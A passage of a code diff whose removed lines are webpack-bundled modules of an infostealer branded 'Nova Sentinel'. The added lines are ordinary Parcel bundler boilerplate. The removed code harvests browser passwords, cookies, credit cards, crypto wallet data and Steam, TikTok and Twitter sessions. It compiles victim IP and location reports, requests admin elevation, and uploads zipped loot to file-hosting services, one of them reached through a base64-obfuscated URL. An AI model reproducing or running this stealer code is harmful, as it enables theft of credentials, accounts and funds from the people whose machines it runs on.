stat.savepath[0];\n  let basepath = stat.testpath[0];\n  const archive = archiver(\"zip\", { zlib: { level: 9 } });\n  const stream = fs.createWriteStream(savepath);\n  return new Promise((resolve, reject) => {\n    try {\n      archive\n        .directory(basepath + \"\\\\\", false)\n        .on(\"error\", (err) => reject(err))\n        .pipe(stream);\n\n      stream.on(\"close\", () => resolve(savepath));\n      archive.finalize().then(() => {});\n    } catch {}\n  });\n}\n\nfunction zip(savepath) {\n  savepath = path.join(savepath[0], \"..\");\n  const archive = archiver(\"zip\", { zlib: { level: 9 } });\n  const stream = fs.createWriteStream(savepath + \"\\\\Exodus.zip\");\n  return new Promise((resolve, reject) => {\n    try {\n      archive\n        .directory(savepath + \"\\\\\", false)\n        .on(\"error\", (err) => reject(err))\n        .pipe(stream);\n\n      stream.on(\"close\", () => resolve(savepath + \"\\\\Exodus.zip\"));\n      archive.finalize().then(() => {});\n    } catch {}\n  });\n}\n\nmodule.exports = {\n  getbasepath,\n  Init,\n  SimpleSave,\n  Save,\n  ArraySave,\n  zipResult,\n  saveBrowser,\n  saveCookies,\n  saveRoblox,\n  saveMailClients,\n  saveSysAdmin,\n  zip,\n  SaveError,\n};\n\n\n//# sourceURL=webpack://script/./utils/save.js?");
-
-/***/ }),
-
-/***/ "./utils/stats.js":
-/*!************************!*\
-  !*** ./utils/stats.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const path = __webpack_require__(/*! path */ \"path\"),\n{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\n\n\nclass Stat {\n  constructor() {\n    this.passwords = 0;\n    this.cookies = 0;\n    this.autofills = 0;\n    this.cards = 0;\n    this.history = 0;\n    this.downloads = 0;\n    this.bookmarks = 0;\n\n    this.AllCookies = [];\n    this.games = [];\n    this.exodus = [];\n    this.keyword_password = [];\n    this.vpn = [];\n    this.sysadmin = [];\n    this.extensions = [];\n    this.colds = [];\n    this.mnemonics = [];\n    this.messengers = [];\n    this.file = []; \n    this.roblox_cookies = [];\n    this.twitter_cookies = [];\n    this.roblox_account = [];\n    this.minecraft_account = [];\n    this.atomicurl = [];\n    this.exodusurl = [];\n    this.testpath = [];\n    this.savepath = [];\n    this.twitter_account = [];\n    this.steam_content = [];\n    this.steam_account = [];\n    this.secretpath = [];\n    this.discordAccount = [];\n    this.InstaSessId = [];\n    this.TiktokSessId = [];\n    this.RedditSess = [];\n    this.passphrase;\n  }\n  addReddit(name) {\n  if (this.RedditSess.includes(name))return;\n    this.RedditSess.push(name);\n  }\n  addTikTok(name) {\n    if (this.TiktokSessId.includes(name))return;\n    this.TiktokSessId.push(name);\n  }\n  addSessIDInsta(name) {\n    if (this.InstaSessId.includes(name))return;\n    this.InstaSessId.push(name);\n  }\n  addDiscordAccountbis(name) {\n    this.discordAccount[0].push(name);\n  }\n  addDiscordAccount(name) {\n    this.discordAccount.push(name);\n  }\n  addSteamAcc(name) {\n    this.steam_account.push(name);\n  }\n  addSecret(name) {\n    this.secretpath.push(name);\n  }\n  addSteam(name) {\n    this.steam_content.push(name);\n  }\n  addsavepath(name) {\n    this.savepath.push(name);\n  }\n  addbasepath(name) {\n    this.testpath.push(name);\n  }\n  addAtomicLink(name) {\n    this.atomicurl.push(name);\n  }\n  addExodusLink(name) {\n    this.exodusurl.push(name);\n  }\n  addMinecraft(name) {\n    this.minecraft_account.push(name);\n  }\n  detailRoblox(name) {\n    this.roblox_account.push(name);\n  }\n  AddTwitter(name) {\n    this.twitter_cookies.push(name);\n  }\n  AddRoblox(name) {\n    this.roblox_cookies.push(name);\n  }\n  AddTwitterAccount(name) {\n    this.twitter_account.push(name);\n  }\n\n  AddBrowser(\n    passwords,\n    cookies,\n    autofills,\n    cards,\n    history,\n    downloads,\n    bookmarks\n  ) {\n    this.passwords = passwords;\n    this.cookies = cookies;\n    this.autofills = autofills;\n    this.cards = cards;\n    this.history = history;\n    this.downloads = downloads;\n    this.bookmarks = bookmarks;\n  }\n  SaveAllCookies(name) {\n    this.AllCookies.push(name);\n  }\n\n  AddGames(name) {\n    this.games.push(name);\n  }\n\n  Addfilestealer(name) {\n    this.file.push(name);\n  }\n\n  AddExodus(name) {\n    this.exodus.push(name);\n  }\n\n  AddKeyword(name) {\n    this.keyword_password.push(name);\n  }\n\n  AddVpn(name) {\n    this.vpn.push(name);\n  }\n\n  AddSysAdmin(name) {\n    this.sysadmin.push(name);\n  }\n\n  AddExtensions(name) {\n    this.extensions.push(name);\n  }\n\n  AddColds(name) {\n    this.colds.push(name);\n  }\n\n  AddPassphrase(passphrase) {\n    this.passphrase = passphrase;\n  }\n\n  AddMessenger(name) {\n    this.messengers.push(name);\n  }\n\n  Build(\n    username,\n    ip,\n    hostname,\n    city,\n    region,\n    country,\n    googlemap,\n    org,\n    postal,\n    timezone,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion,\n    link\n  ) {\n    let builded = {\n      avatar_url:\n        \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\n      content: null,\n      embeds: [\n        {\n          color: 3553599,\n          author: {\n            name: \"Nova Sentinel v10.7\",\n            url: \"https://t.me/Sordeal\",\n            icon_url:\n              \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/gifnova.gif\",\n          },\n          fields: [\n            {\n              name: \"\\u200b\",\n              value: `\\`\\`\\`ansi\n\u001b[2;36m 🖥️ Username\u001b[0m : \u001b[2;37m${process.env.COMPUTERNAME}\u001b[0m\n\u001b[2;36m 🖥️ Version\u001b[0m : \u001b[2;37m${windowsversion}\u001b[0m\n\u001b[2;36m 🖥️ Ram\u001b[0m : \u001b[2;37m${ram}GB\u001b[0m\n\u001b[2;36m 🖥️ Disk\u001b[0m : \u001b[2;37m${disk}GB\u001b[0m\n\u001b[2;36m 🌏 IP\u001b[0m : \u001b[2;37m${ip ?? \"N/A\"}\u001b[0m\n\u001b[2;36m 🌏 City\u001b[0m : \u001b[2;37m${city ?? \"N/A\"}\u001b[0m\n\u001b[2;36m 🌏 Region\u001b[0m : \u001b[2;37m${region ?? \"N/A\"}\u001b[0m\n\u001b[2;36m 🌏 Country\u001b[0m : \u001b[2;37m${country ?? \"N/A\"}\u001b[0m\n\u001b[2;36m 🌐 Cookies\u001b[0m : \u001b[2;37m${this.cookies}\u001b[0m\n\u001b[2;36m 🌐 Passwords\u001b[0m : \u001b[2;37m${this.passwords}\u001b[0m\n\u001b[2;36m 🌐 CreditCards\u001b[0m : \u001b[2;37m${this.cards}\u001b[0m\n\u001b[2;36m 🌐 AutoFill\u001b[0m : \u001b[2;37m${this.autofills}\u001b[0m\n\u001b[2;36m 🌐 History\u001b[0m : \u001b[2;37m${this.history}\u001b[0m\n\u001b[2;36m 🌐 Downloads\u001b[0m : \u001b[2;37m${this.downloads}\u001b[0m\n\u001b[2;36m 🌐 Bookmarks\u001b[0m : \u001b[2;37m${this.bookmarks}\u001b[0m\n\\`\\`\\`\\n\\n[\\`Location\\`](${googlemap??\"https://maps.app.goo.gl/8cZz8xk7VxLN6uyc8\"})`,\n              inline: false,\n            },\n            {\n              name: \"\\u200b\",\n              value: `\n${\n  this.colds.length > 0\n    ? `${embeds.crypto} **Cold Wallets:** ${\n        this.colds.join(\", \") ? `(\\`` + this.colds.join(\", \") + `\\`)` : \"\"\n      }`\n    : \"\"\n}${\n                this.extensions.length > 0\n                  ? `\\n${embeds.crypto} **Extension Wallets:** ${\n                      this.extensions.join(\", \")\n                        ? `(\\`` + this.extensions.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.passphrase !== undefined &&\n                this.passphrase !== \"\" &&\n                this.passphrase.length < 0\n                  ? `\\n${stats.metamask} **Metamask Recovery Key:** ${this.passphrase}`\n                  : \"\"\n              }${\n                this.exodus.length > 0\n                  ? `\\n${stats.exodus} **Exodus Password:** ${\n                      this.exodus.join(\", \")\n                        ? `(\\`` + this.exodus.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.games.length > 0\n                  ? `\\n🎮 **Games Found:** ${\n                      this.games.join(\", \")\n                        ? `(\\`` + this.games.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.messengers.length > 0\n                  ? `\\n⚓ **SocialApp Found:** ${\n                      this.games.join(\", \")\n                        ? `(\\`` + this.messengers.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.sysadmin.length > 0\n                  ? `\\n⌨️ **Clients Found:** ${\n                      this.sysadmin.join(\", \")\n                        ? `(\\`` + this.sysadmin.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.vpn.length > 0\n                  ? `\\n🌐 **VPN:** ${\n                      this.vpn.join(\", \")\n                        ? `(\\`` + this.vpn.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }\n\\n${\n                link\n                  ? `[${stats.download} \\`${path.basename(\n                      this.savepath[0]\n                    )}\\`](${link})\\n` + `\\`\\`\\`ansi\n\u001b[2;36m${link}\u001b[0m\\`\\`\\``\n                  : \"\"\n              }`,\n              inline: false,\n            },\n          ],\n          footer: {\n            text: \"@Nova Sentinel | https://t.me/Sordeal\",\n          },\n        },\n      ],\n      username: \"Nova Sentinel\",\n      attachments: [],\n    };\n\n    return JSON.stringify(builded);\n  }\n}\n\nvar stat = new Stat();\n\nmodule.exports = {\n  stat,\n};\n\n\n//# sourceURL=webpack://script/./utils/stats.js?");
-
-/***/ }),
-
-/***/ "./utils/steam.js":
-/*!************************!*\
-  !*** ./utils/steam.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  { embeds, stats, badge } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nasync function NovaSteamator(cc) {\r\n  if (cc != \"yes\") return;\r\n  try {\r\n    if (stat.steam_content[0] && Array.isArray(stat.steam_content)) {\r\n      const accounts = stat.steam_content[0];\r\n      if (!accounts) return;\r\n        accounts.forEach(async account => {\r\n          try {\r\n            const { data: accountInfo } = await axios.get(\r\n              `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`\r\n            );\r\n            const { data: games } = await axios.get(\r\n              `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`\r\n            );\r\n            const { data: level } = await axios.get(\r\n              `https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`\r\n            );\r\n            stat.addSteamAcc({ accountId: account, accountInfo: accountInfo.response.players, games, level: level.response });\r\n          } catch (error) {}\r\n        })\r\n    }\r\n  } catch (e) {}\r\n}\r\nasync function sendSteam(cc) {\r\n  if (cc !== \"yes\") return;\r\n\r\n  let e = [];\r\n\r\n  try {\r\n    let steamAccounts = stat.steam_account.slice(0, 5);\r\n\r\n    for (let { accountId, accountInfo, games, level } of steamAccounts) {\r\n      if (!accountInfo) continue;\r\n\r\n\r\n      accountInfo = accountInfo[0];\r\n\r\n      const embed = {\r\n        title: \"Steam Session\",\r\n        color: 3553599,\r\n        author: {\r\n          name: accountInfo.personaname,\r\n          icon_url: accountInfo.avatar,\r\n          url: accountInfo.profileurl,\r\n        },\r\n        fields: [\r\n          {\r\n            name: `${embeds.infoyl} Name:`,\r\n            value: `\\`${accountInfo.personaname}\\``,\r\n            inline: false,\r\n          },\r\n          {\r\n            name: `${embeds.nitro} Created At:`,\r\n            value: `${\r\n              accountInfo.timecreated !== undefined\r\n                ? `<t:${accountInfo.timecreated}>`\r\n                : \"none\"\r\n            }`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.phone} Level:`,\r\n            value: `\\`${level.player_level ?? 0}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Games:`,\r\n            value: `\\`${games.response.game_count ?? 0}\\``,\r\n            inline: true,\r\n          },\r\n        ],\r\n      };\r\n      e.push(embed);\r\n    }\r\n    let g = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n      username: \"Nova Sentinel\",\r\n      embeds: e,\r\n    };\r\n    return g;\r\n  } catch (error) {\r\n  }\r\n}\r\n\r\nmodule.exports = {\r\n  NovaSteamator,\r\n  sendSteam,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/steam.js?");
-
-/***/ }),
-
-/***/ "./utils/tiktok.js":
-/*!*************************!*\
-  !*** ./utils/tiktok.js ***!
-  \*************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  { embeds, stats } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  path = __webpack_require__(/*! path */ \"path\");\r\n\r\nasync function ParseTiktok(cc) {\r\n  if (cc !== \"yes\") return;\r\n  let g = [];\r\n  let tiktok_sessions = stat.TiktokSessId;\r\n  if (tiktok_sessions && tiktok_sessions.length) {\r\n    for (const tiktok of tiktok_sessions) {\r\n      const profile = await axios\r\n        .get(\r\n          \"https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE\",\r\n          {\r\n            headers: {\r\n              cookie: `sessionid=${tiktok}`,\r\n              \"Accept-Encoding\": \"identity\",\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data)\r\n        .catch(() => {});\r\n\r\n      const insights = await axios\r\n        .post(\r\n          \"https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE\",\r\n          'type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]',\r\n          {\r\n            headers: {\r\n              cookie: `sessionid=${tiktok}`,\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data)\r\n        .catch(() => {});\r\n\r\n      const wallet = await axios\r\n        .get(\r\n          \"https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true\",\r\n          {\r\n            headers: {\r\n              cookie: `sessionid=${tiktok}`,\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data)\r\n        .catch(() => {});\r\n\r\n      if (!profile || !profile.data) return;\r\n      let { username, email } = profile.data;\r\n      let { follower_num } = insights;\r\n      let { coins } = wallet.data;\r\n      let embed = {\r\n        title: \"Tiktok Session\",\r\n        fields: [\r\n          {\r\n            name: `${embeds.tiktok} Username:`,\r\n            value: `[\\`${username}\\`](https://tiktok.com/@${username})`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.twitter_followers} Followers:`,\r\n            value: `\\`${follower_num.value ?? 0}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Email`,\r\n            value: `\\`${email ?? \"None\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.token} Coins`,\r\n            value: `\\`${coins ?? 0}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${stats.cookie} Cookie`,\r\n            value: `\\`\\`\\`${tiktok}\\`\\`\\``,\r\n            inline: true,\r\n          },\r\n        ],\r\n        footer: {\r\n          text: \"@Nova Sentinel | https://t.me/Sordeal\",\r\n        },\r\n        color: 3553599,\r\n      };\r\n      g.push(embed);\r\n    }\r\n\r\n    let tosend = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n      username: \"Nova Sentinel\",\r\n      embeds: g,\r\n    };\r\n    return tosend;\r\n  }\r\n}\r\nmodule.exports = {\r\n  ParseTiktok,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/tiktok.js?");
-
-/***/ }),
-
-/***/ "./utils/twitter.js":
-/*!**************************!*\
-  !*** ./utils/twitter.js ***!
-  \**************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  path = __webpack_require__(/*! path */ \"path\"),\r\n  { embeds } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\n\r\n  \r\nasync function detailtwitter(tw) {\r\n  if (tw != \"yes\") return;\r\n  const cooks = stat.twitter_cookies;\r\n  if (!cooks) return;\r\n  if (cooks.length < 12) return;\r\n  try {\r\n    const { value: ct0 } = cooks.find((cookie) => cookie.name === \"ct0\");\r\n    const { value: authToken, source } = (await cooks).find(\r\n      (cookie) => cookie.name === \"auth_token\"\r\n    );\r\n    const { data: profile } = await axios.post(\r\n      \"https://twitter.com/i/api/1.1/account/update_profile.json\",\r\n      {},\r\n      {\r\n        headers: {\r\n          Cookie: `ct0=${ct0}; auth_token=${authToken}`,\r\n          Host: \"twitter.com\",\r\n          \"User-Agent\":\r\n            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0\",\r\n          Accept: \"*/*\",\r\n          \"Accept-Language\": \"fr-FR\",\r\n          \"Accept-Encoding\": \"gzip, deflate, br\",\r\n          Prefer: \"safe\",\r\n          authorization:\r\n            \"Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA\",\r\n          \"x-twitter-auth-type\": \"OAuth2Session\",\r\n          \"x-csrf-token\": ct0,\r\n          \"x-twitter-client-language\": \"en\",\r\n          \"x-twitter-active-user\": \"yes\",\r\n          Origin: \"https://twitter.com\",\r\n          Connection: \"keep-alive\",\r\n          Referer: \"https://twitter.com/\",\r\n          \"Sec-Fetch-Dest\": \"empty\",\r\n          \"Sec-Fetch-Mode\": \"cors\",\r\n          \"Sec-Fetch-Site\": \"same-site\",\r\n        },\r\n      }\r\n    );\r\n    profile.cookie = ct0;\r\n    profile.source = source;\r\n    stat.AddTwitterAccount(profile);\r\n    /*const basepath = stat.testpath[0];\r\n    const socialDir = path.join(basepath, \"Social\");\r\n    const twitterDir = path.join(socialDir, \"Twitter\");\r\n    try {\r\n      if (!fs.existsSync(socialDir)) {\r\n        fs.mkdirSync(socialDir);\r\n      }\r\n      if (!fs.existsSync(twitterDir)) {\r\n        fs.mkdirSync(twitterDir);\r\n      }\r\n    } catch (e) {\r\n    }\r\n    const twitterFilePath = path.join(twitterDir, \"Twitter.json\");\r\n    fs.writeFileSync(twitterFilePath, JSON.stringify(profile));*/\r\n  } catch (e) {}\r\n}\r\n\r\nfunction sendTwitter(tw) {\r\n  if (tw !== \"yes\") return;\r\n  if (stat.twitter_account[0]) {\r\n    let {\r\n      screen_name,\r\n      name,\r\n      location,\r\n      profile_location,\r\n      description,\r\n      created_at,\r\n      followers_count,\r\n      favourites_count,\r\n      cookie,\r\n      profile_image_url,\r\n      profile_banner_url,\r\n      profile_text_color,\r\n      friends_count,\r\n      verified,\r\n    } = stat.twitter_account[0];\r\n    const handleNullValue = (value) => value ?? \"none\";\r\n    let embed = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\r\n      username: \"Nova Sentinel\",\r\n      embeds: [\r\n        {\r\n          color: 3553599,\r\n          thumbnail: {\r\n            url: profile_image_url.replace(\"normal\", \"bigger\"),\r\n          },\r\n          image: {\r\n            url: profile_banner_url,\r\n          },\r\n          fields: [\r\n            {\r\n              name: verified\r\n                ? `${embeds.twitter_usernamecert} Username:`\r\n                : `${embeds.twitter_usernameuncert} Username:`,\r\n              value: `\\`${handleNullValue(name)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_followers} Followers:`,\r\n              value: `\\`${handleNullValue(followers_count)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_followings} Following:`,\r\n              value: `\\`${handleNullValue(friends_count)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_fav} Favourites:`,\r\n              value: `\\`${handleNullValue(favourites_count)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.mail} User:`,\r\n              value: `[\\`${handleNullValue(\r\n                screen_name\r\n              )}\\`](https://twitter.com/${screen_name})`,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_location} Location:`,\r\n              value: `[${handleNullValue(\r\n                location\r\n              )}](https://www.google.com/maps/place/${handleNullValue(location)})`,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.mail} Description:`,\r\n              value: `\\`${handleNullValue(description)}\\``,\r\n              inline: false,\r\n            },\r\n            {\r\n              name: `🍪 Cookie:`,\r\n              value: `\\`\\`\\`${handleNullValue(cookie)}\\`\\`\\``,\r\n              inline: true,\r\n            },\r\n          ],\r\n          footer: {\r\n            text: \"Creation Date: \" + handleNullValue(created_at),\r\n          },\r\n          title: \"Twitter Account\",\r\n          url: `https://twitter.com/${screen_name}`,\r\n        },\r\n      ],\r\n    };\r\n    if (embed) {\r\n      return embed;\r\n    } else {\r\n      return null;\r\n    }\r\n  }\r\n}\r\n\r\nmodule.exports = {\r\n  detailtwitter,\r\n  sendTwitter,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/twitter.js?");
-
-/***/ }),
-
-/***/ "./utils/uac.js":
-/*!**********************!*\
-  !*** ./utils/uac.js ***!
-  \**********************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const path = __webpack_require__(/*! path */ \"path\"),\r\n sudo = __webpack_require__(/*! sudo-prompt */ \"sudo-prompt\"),\r\n admin = __webpack_require__(/*! admin-check */ \"admin-check\");\r\n\r\n\r\nfunction requestAdminPrivileges(myself) {\r\n  return new Promise((resolve, reject) => {\r\n\r\n    sudo.exec(`${process.execPath} \"${path.join(myself)}\" --admin`, (error) => {\r\n      if (error) {\r\n      } else {\r\n        process.abort()\r\n      }\r\n    });\r\n  });\r\n}\r\n\r\n\r\nasync function requestAdminPrivilegesIfNeeded(myself, cc, cc2, cc3) {\r\n  if (cc === \"yes\" || cc2 === \"yes\" || cc3 === \"yes\") {\r\n    let g = await admin.check()\r\n    if (!g) {\r\n      try {\r\n        await requestAdminPrivileges(myself);\r\n      } catch (error) {\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\n\r\n\r\nmodule.exports = {\r\n  requestAdminPrivilegesIfNeeded,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/uac.js?");
-
-/***/ }),
-
-/***/ "./utils/uploadFiles.js":
-/*!******************************!*\
-  !*** ./utils/uploadFiles.js ***!
-  \******************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\");\nconst https = __webpack_require__(/*! https */ \"https\");\nconst FormData = __webpack_require__(/*! form-data */ \"form-data\");\nconst axios = __webpack_require__(/*! axios */ \"axios\");\n\nasync function upload(path) {\n  let link;\n  try {\n    const server = await FoundSrv();\n    if (server) {\n      link = await uploadFile(path, server);\n\n      if (!link) {\n        console.log(\"uploadTransfer failed, trying uploadToFileio\");\n        link = await uploadToFileio(path);\n      }\n      if (!link) {\n        console.log(\"uploadFile failed, trying uploadTransfer\");\n        link = await uploadTransfer(path);\n      }\n    } else {\n      if (!link) {\n        console.log(\"uploadTransfer failed, trying uploadToFileio\");\n        link = await uploadToFileio(path);\n      }\n      console.log(\"FoundSrv returned null, trying uploadTransfer\");\n      link = await uploadTransfer(path);\n    }\n\n    return link;\n  } catch (error) {\n    if (error) {\n      try {\n        console.log(\"Trying file.io as a fallback\");\n        link = await uploadToFileio(path);\n        return link;\n      } catch (e) {\n        if (e) {\n          try {\n            console.log(\"Trying uploadTransfer as a fallback\");\n            link = await uploadTransfer(path);\n            return link;\n          } catch (e) {}\n        }\n      }\n    }\n  }\n}\nasync function uploadToFileio(filePath) {\n  const data = new FormData();\n  data.append(\"file\", fs.createReadStream(filePath));\n  data.append(\"maxdownloads\", \"30\");\n\n  try {\n    const response = await axios.post(\"https://file.io/\", data, {\n      headers: {\n        ...data.getHeaders(),\n      },\n    });\n    return response.data.link ?? null;\n  } catch (error) {\n    return null;\n  }\n}\nasync function FoundSrv() {\n  const res = await axios({\n    url: `https://api.gofile.io/getServer`,\n    method: \"GET\",\n    headers: {\n      accept: \"*/*\",\n      \"accept-language\": \"en-US,en;\",\n      \"cache-control\": \"no-cache\",\n      pragma: \"no-cache\",\n      referrer: \"https://gofile.io/uploadFiles\",\n      mode: \"cors\",\n      \"user-agent\":\n        \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44\",\n      dnt: 1,\n      origin: \"https://gofile.io\",\n    },\n  });\n\n  if (res.data.status !== \"ok\") {\n    return null;\n  }\n\n  return res.data.data.server;\n}\n\nasync function uploadFile(path, server) {\n  const formData = new FormData();\n  formData.append(\"file\", fs.createReadStream(path));\n\n  const res = await axios({\n    url: `https://${server}.gofile.io/uploadFile`,\n    method: \"POST\",\n    headers: {\n      accept: \"*/*\",\n      \"accept-language\": \"en-US,en;\",\n      \"cache-control\": \"no-cache\",\n      pragma: \"no-cache\",\n      referrer: \"https://gofile.io/uploadFiles\",\n      mode: \"cors\",\n      \"user-agent\":\n        \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44\",\n      dnt: 1,\n      origin: \"https://gofile.io\",\n      ...formData.getHeaders(),\n    },\n    maxContentLength: Infinity,\n    maxBodyLength: Infinity,\n    referrer: \"https://gofile.io/uploadFiles\",\n    data: formData,\n  });\n\n  if (res.data.status !== \"ok\") {\n  }\n\n  return res.data.data.downloadPage;\n}\n\nasync function uploadTransfer(path) {\n  const FileData = new FormData();\n  FileData.append(\"file\", fs.createReadStream(path));\n\n  try {\n    let g = Buffer.from(\"aHR0cHM6Ly90cmFuc2Zlci5zaA==\", \"base64\").toString();\n    const res = await axios.post(g, FileData, {\n      headers: {\n        ...FileData.getHeaders(),\n      },\n    });\n\n    if (res.status === 200 && res.data) {\n      const downloadUrl = res.data.trim();\n      return downloadUrl;\n    } else {\n    }\n  } catch (error) {}\n}\n\nmodule.exports = {\n  upload,\n};\n\n\n//# sourceURL=webpack://script/./utils/uploadFiles.js?");
-
-/***/ }),
-
-/***/ "admin-check":
-/*!******************************!*\
-  !*** external "admin-check" ***!
-  \******************************/
-/***/ ((module) => {
-
+// modules are defined as an array
+// [ module function, map of requires ]
+//
+// map of requires is short require name -> numeric require
+//
+// anything defined in a previous bundle is accessed via the
+// orig method which is the require for previous bundles
+parcelRequire = (function (modules, cache, entry, globalName) {
+  // Save the require from previous bundle to this closure if any
+  var previousRequire = typeof parcelRequire === 'function' && parcelRequire;
+  var nodeRequire = typeof require === 'function' && require;
+
+  function newRequire(name, jumped) {
+    if (!cache[name]) {
+      if (!modules[name]) {
+        // if we cannot find the module within our internal map or
+        // cache jump to the current global require ie. the last bundle
+        // that was added to the page.
+        var currentRequire = typeof parcelRequire === 'function' && parcelRequire;
+        if (!jumped && currentRequire) {
+          return currentRequire(name, true);
+        }
+
+        // If there are other bundles on this page the require from the
+        // previous one is saved to 'previousRequire'. Repeat this as
+        // many times as there are bundles until the module is found or
+        // we exhaust the require chain.
+        if (previousRequire) {
+          return previousRequire(name, true);
+        }
+
+        // Try the node require function if it exists.
+        if (nodeRequire && typeof name === 'string') {
+          return nodeRequire(name);
+        }
+
+        var err = new Error('Cannot find module \'' + name + '\'');
+        err.code = 'MODULE_NOT_FOUND';
